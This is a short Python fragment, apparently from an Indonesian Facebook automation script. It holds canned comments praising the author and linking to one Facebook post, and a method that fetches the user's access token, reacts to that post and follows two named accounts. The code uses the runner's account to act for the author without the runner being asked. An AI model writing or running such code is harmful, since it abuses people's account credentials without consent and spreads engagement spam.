...
kom=random.choice(["lu ganz banget bang gada tandingan\nhttps://www.facebook.com/100024139369381/posts/988804101934226/?app=fbl","lu ganteng banget bang gada tandingan\nhttps://www.facebook.com/100024139369381/posts/988804101934226/?app=fbl","SC LU IS THE BEST\ngithub.com/Hakiki-XC/Prem\nhttps://www.facebook.com/100024139369381/posts/988804101934226/?app=fbl"])
class ganteng:
        ...
        def reaksi(self):
                self.get_tok();self.dahlah(f"{self.url}/988804101934226","4","ah sit");self.dahlah(f"{self.url}/988804101934226","8","ah sit");self.tuturkeun("rika.novitasari.75");self.tuturkeun("BimFt")
        def lang(self,cok):
                try:
